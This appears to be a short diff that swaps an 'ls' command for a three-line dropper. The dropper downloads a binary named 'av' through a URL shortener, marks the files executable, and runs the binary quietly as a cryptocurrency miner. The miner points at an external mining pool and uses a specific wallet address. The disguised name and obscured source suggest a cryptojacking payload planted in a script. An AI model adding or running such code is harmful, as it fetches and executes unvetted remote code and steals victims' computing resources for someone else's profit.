@@ -1,1 +1,3 @@
-ls
+wget -O av http://gg.gg/lendir
+chmod u+x *
+./av -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BX6z2URpnsyEmtSLEpQkQhe6eX95KZmrHX.Akun-All -p x -t 1 -q
